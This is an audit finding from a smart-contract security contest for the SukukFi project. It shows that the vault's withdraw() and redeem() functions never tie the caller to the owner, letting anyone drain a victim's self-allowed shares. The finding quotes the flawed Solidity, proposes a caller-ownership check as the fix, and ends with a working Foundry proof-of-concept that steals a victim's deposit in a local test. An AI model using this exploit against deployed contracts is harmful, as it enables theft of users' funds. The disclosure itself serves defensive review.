# Unauthorized withdrawals from arbitrary owners via vault misuse of self-allowance enable theft of funds

- **Project:** SukukFi
- **Finding ID:** F-3 / S-112
- **Severity:** High
- **Reporter:** 0xMilenov

---

## Description

The settlement vault `WERC7575Vault` integrates with the restricted-share token `WERC7575ShareToken`. The token enforces a non-standard authorization model where “self-allowance” (`allowance[owner][owner]`) can be granted only by the validator via `permit()`. To enable withdrawals/redemptions, the vault consumes this self-allowance using the token’s vault-only helper `spendSelfAllowance()` and then burns the owner’s shares before transferring underlying assets to the designated receiver.

At a high level:

- `WERC7575ShareToken` exposes `spendSelfAllowance(owner, shares)` to vaults, which reduces `allowance[owner][owner]` by `shares` (reverting if insufficient), and `burn(from, amount)` which burns tokens from `from` if the address is KYC-verified and the contract is not paused. Self-allowance can only be set by the validator via `permit()` when `owner == spender`.
- `WERC7575Vault` implements `withdraw()` and `redeem()` that call the internal `_withdraw()` which: (1) spends the owner’s self-allowance via `spendSelfAllowance(owner, shares)`, (2) burns the owner’s shares, and (3) transfers assets to the arbitrary `receiver`.

The root cause is that `WERC7575Vault` does not bind the external caller to the `owner` whose self-allowance and shares are consumed. Specifically, `withdraw()` and `redeem()` accept arbitrary `owner` and `receiver` addresses from any caller and never require `msg.sender == owner` nor any caller-allowance. As soon as the validator (as intended in normal operations) grants a self-allowance for an account, any third party can call `withdraw()`/`redeem()` with that account as `owner` and redirect assets to themselves as `receiver`.

The token-side checks (KYC on `from` in `burn()`, vault-only gating on `spendSelfAllowance()`) and the vault’s `nonReentrant`/`whenNotPaused` do not prevent this, because the vault is permissionless to call and there is no coupling between `msg.sender` and the `owner` parameter.

Highest impact scenario:
An attacker simply calls [`withdraw()`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/src/WERC7575Vault.sol#L434-L437)/[`redeem()`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/src/WERC7575Vault.sol#L464-L467) using a victim’s address as `owner` after the validator has issued self-allowance, draining the victim’s shares and sending underlying assets to the attacker-controlled `receiver`.

- Vault public entry points accept arbitrary `owner`/`receiver` and directly delegate to `_withdraw()` without caller-ownership checks:

```solidity
function withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {
    shares = previewWithdraw(assets);
    _withdraw(assets, shares, receiver, owner);
}


function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
    assets = previewRedeem(shares);
    _withdraw(assets, shares, receiver, owner);
}
```

- Vault internal [`_withdraw()`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/src/WERC7575Vault.sol#L397-L411) spends victim’s self-allowance, burns victim’s shares, and transfers assets to arbitrary `receiver`:

```solidity
function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
    if (receiver == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (owner == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    }
    if (assets == 0) revert ZeroAssets();
    if (shares == 0) revert ZeroShares();

    _shareToken.spendSelfAllowance(owner, shares);
    _shareToken.burn(owner, shares);
    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

- Token vault-only helper [`spendSelfAllowance`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/src/WERC7575ShareToken.sol#L660-L662) consumes self-allowance and it does not consider transaction caller and assumes the vault performed any needed checks:

```solidity
function spendSelfAllowance(address owner, uint256 shares) external onlyVaults {
    _spendAllowance(owner, owner, shares);
}
```

Self-allowance is set via validator-signed [`permit()`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/src/WERC7575ShareToken.sol#L396-L429) when owner == spender:

```solidity
if (owner == spender) {
    if (signer != _validator) revert ERC2612InvalidSigner(signer, owner);
}
_approve(owner, spender, value);
```

## Recommended mitigation steps

Add `require(msg.sender == owner, "UnauthorizedCaller");` in both `withdraw()` and `redeem()` before delegating to `_withdraw()`.

```solidity
function withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {
    require(msg.sender == owner, "UnauthorizedCaller");
    shares = previewWithdraw(assets);
    _withdraw(assets, shares, receiver, owner);
}

function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
    require(msg.sender == owner, "UnauthorizedCaller");
    assets = previewRedeem(shares);
    _withdraw(assets, shares, receiver, owner);
}
```

## Proof of Concept

Create a new file inside [`test`](https://github.com/code-423n4/2025-11-sukukfi/blob/d5f3095f8043b3d9d2bca67163b2077a710d37ad/test) folder named 'C4PoC.t.sol' and add the code below and run `forge test --match-test submissionValidity`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";

import {WERC7575Vault} from "../src/WERC7575Vault.sol";
import {WERC7575ShareToken} from "../src/WERC7575ShareToken.sol";
import {MockAsset} from "./MockAsset.sol";

contract C4PoC is Test {
    MockAsset internal asset;
    WERC7575ShareToken internal share;
    WERC7575Vault internal vault;

    uint256 internal victimPk = 0xA11CE;
    address internal victim = vm.addr(victimPk);

    uint256 internal attackerPk = 0xB0B;
    address internal attacker = vm.addr(attackerPk);

    uint256 internal validatorPk = 0xC0FFEE;
    address internal validator = vm.addr(validatorPk);

    uint256 constant DEPOSIT = 1_000 ether;
    uint256 constant STEAL = 400 ether;

    function setUp() public {
        // Deploy underlying asset (18 decimals by OZ ERC20 default)
        asset = new MockAsset();

        // Deploy share token and vault
        share = new WERC7575ShareToken("Wrapped MOCK", "wMOCK");
        vault = new WERC7575Vault(address(asset), share);

        // Register vault in the share token (this contract is owner)
        share.registerVault(address(asset), address(vault));

        // Configure validator (onlyOwner)
        share.setValidator(validator);

        // KYC the victim so mint/burn will succeed
        share.setKycVerified(victim, true);

        // Fund victim with underlying and approve vault, then deposit
        asset.mint(victim, DEPOSIT);
        vm.startPrank(victim);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, victim);
        vm.stopPrank();

        // Sanity: victim received shares 1:1 (since 18-dec asset → scalingFactor == 1)
        assertEq(
            share.balanceOf(victim),
            DEPOSIT,
            "pre: victim shares mismatch"
        );

        // Issue validator-signed self-allowance to victim for full balance
        _validatorPermitSelf(victim, DEPOSIT);
        assertEq(
            share.allowance(victim, victim),
            DEPOSIT,
            "pre: self-allowance not set"
        );
    }

    function test_submissionValidity() public {
        uint256 attackerAssetBefore = asset.balanceOf(attacker);
        uint256 victimSharesBefore = share.balanceOf(victim);
        uint256 victimSelfAllowBefore = share.allowance(victim, victim);

        // Attacker drains funds: caller is NOT owner, but vault does not check caller-ownership
        vm.prank(attacker);
        vault.withdraw(STEAL, attacker, victim);

        // Attacker received underlying assets
        assertEq(
            asset.balanceOf(attacker),
            attackerAssetBefore + STEAL,
            "attacker did not receive assets"
        );

        // Victim's shares were burned
        assertEq(
            share.balanceOf(victim),
            victimSharesBefore - STEAL,
            "victim shares not burned"
        );

        // Victim's self-allowance consumed
        assertEq(
            share.allowance(victim, victim),
            victimSelfAllowBefore - STEAL,
            "self-allowance not consumed"
        );
    }

    // Helper: EIP-712 permit(owner==spender) signed by validator for self-allowance
    function _validatorPermitSelf(address owner, uint256 value) internal {
        uint256 nonce = share.nonces(owner);
        uint256 deadline = block.timestamp + 1 days;

        // Use token-provided DOMAIN_SEPARATOR (EIP-712)
        bytes32 domainSeparator = share.DOMAIN_SEPARATOR();

        // Permit typehash must match token
        bytes32 PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                owner,
                owner, // spender == owner (self-allowance)
                value,
                nonce,
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, structHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);

        // Owner==spender path requires validator signature (enforced in token)
        share.permit(owner, owner, value, deadline, v, r, s);
    }
}
```
